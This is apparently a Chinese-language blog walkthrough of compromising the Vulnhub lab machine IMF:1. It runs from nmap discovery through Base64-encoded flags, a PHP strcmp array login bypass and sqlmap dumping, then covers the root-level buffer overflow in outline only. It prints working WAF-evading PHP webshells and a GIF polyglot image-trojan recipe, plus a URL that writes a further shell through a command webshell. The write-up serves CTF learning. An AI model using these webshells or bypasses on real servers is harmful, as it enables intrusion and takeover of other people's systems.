---
title: IMF
published: 2026-08-31
description: 对 Vulnhub 靶机 IMF:1 的完整渗透测试记录，涵盖从信息收集到获取 root 权限的完整过程。
image: ./images/Pasted image 20260831124658.png
tags:
  - Vulnhub
  - 渗透测试
  - 靶机
  - 提权
  - 缓冲区溢出
category: Vulnhub靶场
draft: false
pinned: false
lang: zh-CN
author: Ynm
comment: true
---

| **项目**         | **详情**                                   |
| -------------- | ---------------------------------------- |
| **靶机名称**       | IMF: 1                                   |
| **难度等级**       | Medium（中等）                               |
| **目标**         | 获取 root 权限并找到六个 flag                     |
| **下载链接**       | https://www.vulnhub.com/entry/imf-1,162/ |
| **攻击机 (Kali)** | `192.168.197.10`（建议使用 NAT 模式）            |
| **靶机**         | `192.168.197.176`（DHCP 自动分配）             |
## 一、 信息收集 (Reconnaissance)

*信息收集是渗透测试的基石，决定了后续攻击面的广度。*

### 1.1 主机发现
使用 `nmap` 在本地网络中定位靶机 IP。
```
nmap -sn 192.168.197.0/24
```
![](images/Pasted%20image%2020260831130437.png)
结果输出：发现目标 IP 为：`192.168.197.176`
### 1.2 端口与服务扫描
使用 Nmap 对靶机进行全面的端口和服务扫描。
```
# 快速全端口扫描
nmap -p- --min-rate 1000 -T4 192.168.197.176
# 深入服务探测
nmap -sC -sV -O 192.168.197.176
```
![](images/Pasted%20image%2020260831131427.png)
**扫描结果分析**：

| 端口  | 服务            | 状态  | 初步判断         |
| :-- | :------------ | :-- | :----------- |
| 80  | Apache 2.4.18 | 开放  | 主要攻击面，Web 应用 |
> **注意**：后续在提权阶段会发现 7788 端口，但初始扫描时因防火墙设置未能发现。
## 二、 漏洞利用 (Exploitation)

*根据信息收集结果，选择最有可能的突破口进行深入利用。*

### 2.1 Web 渗透

#### 2.1.1 获取 Flag1
既然靶机开放了80端口，即HTTP服务，那就访问一下吧。

访问网站 `http://192.168.197.176`，在 `contact us` 页面查看网页源代码，发现第一个 Flag。
![](images/Pasted%20image%2020260831131854.png)
```html
<!-- flag1{YWxsdGhlZmlsZXM=} -->
```
将 Flag1 的内容进行 Base64 解码：
```
echo "YWxsdGhlZmlsZXM=" | base64 -d
```
![](images/Pasted%20image%2020260831135046.png)
结果：allthefiles，因此`flag1{allthefiles}`。
#### 2.1.2 获取 Flag2
在首页源代码中发现三个奇怪的 JS 文件名。
```
eVlYUnZjZz09fQ==
XUnRhVzVwYzNS
ZmxhZzJ7YVcxbVl
```
![](images/Pasted%20image%2020260901092230.png)

**关键（这些前缀在CTF中几乎是“条件反射”级别的特征）：**
1. flag 的开头 fla 编码后就是 Zmxh
2. 如果编码完整的 flag，结果是 ZmxhZw\==
3. 同理，flag{ 编码后固定是 ZmxhZ3s=
4. root 编码后是 cm9vdA\==

因此可以将其**按顺序**拼接后进行 Base64 解码（Zmxh开头的部分放在前面，以\==结尾的部分放在后面，剩下的部分放在中间）。
```
echo "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==" | base64 -d
```
得到：flag2{aW1mYWRtaW5pc3RyYXRvcg\=\=}

再次解码 Flag2 的内容：
```
echo "aW1mYWRtaW5pc3RyYXRvcg==" | base64 -d
```
![](images/Pasted%20image%2020260831135542.png)
结果：imfadministrator，因此`flag2{imfadministrator}`。

#### 2.1.3 获取后台路径与 Flag3
>**注意：** 记住上面的信息收集每一条都是有用的，上面解出来的东西都是比较规律的，有可能是目录之类的。

因此访问路径 `/imfadministrator`，进入后台登录页面（如果访问allthefiles路径，则发现没有该资源）。查看网页源码，发现提示：“我无法使用 SQL，所以我硬编码了密码。它仍然非常安全”，因此没有SQL注入。
![](images/Pasted%20image%2020260901094227.png)
**步骤 1：枚举用户名**

输入不存在的用户名，页面回显无效的用户名（Invalid username）。因此尝试输入存在的用户名，在 `contact.php` 页面中有三个用户名：`rmichaels`、`akeith`、`estone`。
![](images/Pasted%20image%2020260901094552.png)
逐一测试后确认有效用户名为`rmichaels`，因为回显变为无效的密码（Invalid password），而不是回显无效的用户名。
![](images/Pasted%20image%2020260901094756.png)
**步骤 2：PHP 数组绕过登录**
>注意：这里当然可以暴力破解，因为已经知道了用户名，但是这里有更好的办法，因为根据网页源代码的提示，这个密码的验证是写死在php代码中的，因此可以使用PHP数组绕过登录。

**原理：** php验证代码可能如下
```
$password = $_POST['password']; // 用户输入
if (strcmp($password, $admin_password) == 0) {
    // 登录成功！
}
```
php代码可能是用strcmp之类的函数去判断密码。当strcmp的两个字符串参数相等的时候返回结果为0，string类型和array类型相比较，它会出错，但返回的不是“报错并停止”，而是 **`NULL`**。又因为在PHP的弱类型比较中，`NULL == 0` 的结果是 **`true`（真）**，因此成功绕过。

修改网页源代码，将密码参数 `pass` 改为数组形式（当然这里也可以使用抓包，然后修改数据包）。
![](images/Pasted%20image%2020260901100058.png)
成功登录后获得 Flag3：
```
flag3{Y29udGludWVUT2Ntcw==}
```
![](images/Pasted%20image%2020260901100723.png)
Base64 解码得到：`continueTOcms`，因此`flag3{continueTOcms}`。
### 2.2 SQL 注入与 Flag4

成功登录后，访问 CMS 页面（因为flag3的提示）：`http://192.168.197.176/imfadministrator/cms.php?pagename=home`。URL有GET传参，因此存在SQL注入，在 URL 参数 `pagename` 后加单引号测试，发现 MySQL 报错回显，确认存在 SQL 注入漏洞。
![](images/Pasted%20image%2020260901101659.png)


![](images/Pasted%20image%2020260901103339.png)


![](images/Pasted%20image%2020260901103435.png)

```
sqlmap -r req.txt --batch --dbs
```
![](images/Pasted%20image%2020260901104541.png)
```
sqlmap -r req.txt --batch -D admin --tables
```
![](images/Pasted%20image%2020260901104703.png)
```
sqlmap -r req.txt --batch -D admin -T pages --dump
```
![](images/Pasted%20image%2020260901104905.png)
爆破数据库 `admin` 中的 `pages` 表，获取到一条图片路径记录。访问该路径，发现一张二维码图片。
![](images/Pasted%20image%2020260901105047.png)
扫描二维码得到 Flag4：
```
flag4{dXBsb2Fkcjk0Mi5waHA=}
```
解码后得到`flag4{uploadr942.php}`，同时获得文件上传路径：uploadr942.php。

### 2.3 文件上传与 WebShell（Flag5）

访问 `http://192.168.197.176/imfadministrator/uploadr942.php`，发现是一个文件上传界面。使用PHP一句话进行上传，通过不断测试，发现存在WAF和文件头检测，尝试修改Content-Type：image/jpeg，文件头加上GIF89a也是无效。
![](images/Pasted%20image%2020260901112920.png)
所以采用另外一个方法，制作一个图片马。

由于WAF过滤比较严，直接写`<?php @eval($_POST['ant']); ?>`会被拦截，因此使用assert函数，同时使用“.”连接两部分，具体webshell内容如下。
```
<?php $a="ass"."ert";$a($_POST["ant"]); ?>
```
然后使用一个git图片做图片马。

>注意：根据事后分析，这里只能用git图片，不能用其他类型的图片，因为.htaccess文件里只允许git图片以php的形式运行。
>![](images/Pasted%20image%2020260901124349.png)
```
copy /b 普通图片.gif + webshell.php webshell.gif
```
![](images/Pasted%20image%2020260901123924.png)
上传后查看网页源代码，获取服务器重命名的文件名。
![](images/Pasted%20image%2020260901123837.png)
此时如果我们直接访问，发现没有，推测应该是图片被保存在某个文件夹下面了，可以猜测是在imfadministrator目录下，我们可以进行目录扫描。
![](images/Pasted%20image%2020260901125618.png)
使用dirsearch扫描，命令如下：
```
dirsearch -u http://192.168.197.176/imfadministrator/ -e php,html,txt -w /usr/share/wordlists/dirb/common.txt -t 50

-u：指定目标 URL
-e：添加常见的扩展名（如 PHP、HTML、TXT），以便发现带有这些后缀的目录或文件
-w：指定字典文件（这里使用 Kali 自带的 common.txt，比较全面）
-t：设置线程数（50 线程速度较快，可根据网络情况调整）
```
![](images/Pasted%20image%2020260901130227.png)
访问该url，发现可以访问，说明上传成功。
```
http://192.168.197.176/imfadministrator/uploads/4994055bd05d.gif
```
![](images/Pasted%20image%2020260901130409.png)
使用蚁剑连接WebShell，记得要切换成base64编码器，否则无法连接，因为会被WAF过滤：
![](images/Pasted%20image%2020260901123808.png)
连接成功之后，查看文件获取flag。
![](images/Pasted%20image%2020260901125324.png)

将 Flag5 进行 Base64 解码，解码结果：agentservices，因此`flag5{agentservices}`。

**补充：** 也可以使用下面的webshell，同样制作图片马并上传（这个shell只能执行系统命令，因为是用echo，所以也叫命令马）。
```
 <?php $s=$_GET['topsec']; echo `$s`; ?>
 //此时需要注意最前面加一个空格，要不然生成图片马的时候会覆盖掉导致乱码
```
然后用命令马快速写一个“完美蚁剑马”。
```
http://192.168.197.176/imfadministrator/uploads/重命名.gif?topsec=echo '<?php $a="ass"."ert";$a($_POST["ant"]); ?>' > /var/www/html/imfadministrator/uploads/shell.php
# 注意：在Ubuntu系统中，Apache的默认网站根目录是/var/www/html/
```
之后连接该shell.php，记得编码器要切换到base64。
## 三、 权限提升 (Privilege Escalation)

*现在的目标是从普通用户提权至 `root`。*

### 3.1 发现 Agent 服务

根据 Flag5 的提示 `agentservices`，在靶机中搜索相关文件：
```
whereis agent
```
发现文件：
![](images/Pasted%20image%2020260901134439.png)

查看配置文件内容：
```
service agent {
    flags = REUSE
    socket_type = stream
    wait = no
    user = root
    server = /usr/local/bin/agent
    disable = no
    port = 7788
}
```
该服务以 **root 权限**运行在 **7788 端口**。

查看当前端口状态，确认 7788 端口已开放：
```bash
www-data@imf:/tmp$ netstat -atnup
```
```
tcp 0 0 0.0.0.0:7788 0.0.0.0:* LISTEN -
```

### 3.2 缓冲区溢出漏洞利用

#### 3.2.1 分析 Agent 程序
将 `/usr/local/bin/agent` 文件下载到攻击机进行分析。
```bash
# 在靶机上
www-data@imf:/tmp$ nc -lvp 4444 < /usr/local/bin/agent

# 在攻击机上 (Kali IP: 192.168.197.10)
kali@kali:~$ nc 192.168.197.176 4444 > agent
```
查看文件保护信息：
```bash
file agent
checksec agent
```
该文件为 **32 位**、小端序、动态链接程序，且存在**可读可写可执行段**。

#### 3.2.2 构造 Exploit
将 `agent` 文件拖入 IDA 或 Ghidra 进行逆向分析。

发现程序存在缓冲区溢出漏洞，需要：
- 填充数据使程序溢出
- 将返回地址覆盖为 shellcode 地址
- 将 shellcode 写入 RWX 段

编写 Python exploit 脚本，连接靶机 7788 端口发送恶意 payload。

成功执行后获得 root 权限的反弹 Shell。

### 3.3 获取 Flag6

获取 root 权限后，在 `/root` 目录下找到最终的 Flag6。